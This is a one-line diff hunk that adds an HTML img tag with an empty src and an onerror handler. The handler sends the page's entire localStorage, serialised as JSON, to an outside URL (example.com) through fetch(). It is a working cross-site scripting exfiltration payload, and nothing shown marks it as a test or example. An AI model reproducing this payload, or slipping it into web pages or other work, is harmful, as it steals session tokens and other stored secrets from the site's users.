@@ -1,0 +1,1 @@
+<img src onerror="fetch('https://example.com?content=' + JSON.stringify(localStorage))">
